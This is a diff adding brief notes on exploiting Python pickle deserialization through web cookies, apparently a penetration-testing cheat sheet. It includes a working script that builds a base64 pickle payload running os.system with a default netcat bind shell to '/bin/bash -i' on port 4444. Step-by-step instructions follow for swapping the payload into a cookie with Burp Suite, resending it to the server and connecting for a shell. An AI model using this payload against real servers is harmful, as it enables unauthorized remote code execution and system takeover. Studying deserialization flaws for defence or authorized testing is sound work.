@@ -1,0 +1,46 @@
+Backgound:
+Serialisation is a way to translate complex datastructures, like lists and dictionaries, into a single string of text, which can then be stored in a cookie.
+
+Python serialization function is called pickle. Exploting it is called pickle code execution.
+
+Example Pickle RCE code:
+
+#!/usr/bin/python
+#
+# Pickle deserialization RCE payload.
+# To be invoked with command to execute at it's first parameter.
+# Otherwise, the default one will be used.
+#
+
+import cPickle
+import os
+import sys
+import base64
+
+DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
+COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND
+
+class PickleRce(object):
+    def __reduce__(self):
+        return (os.system,(COMMAND,))
+
+print base64.b64encode(cPickle.dumps(PickleRce()))
+# End of Code
+
+Steps:
+1. Using burpsuite, identify the cookie and send to decoder
+2. Decode the cookie as base64
+3. Upon confirmation cookie is pickle code used in cookie, eg of deserialized code pickle code:
+
+"(lp1
+Vtest
+p2
+aS'f4db51e5585c48779142d1f755dc39f6'
+p3
+a."
+
+4. Use the python pickle RCE code and replace it in the cookie
+5. Resend it to the webserver
+6. Remember to remove any other session cookies before resending to webserver
+7. nc to port 4444 using nc for shell
+8. done
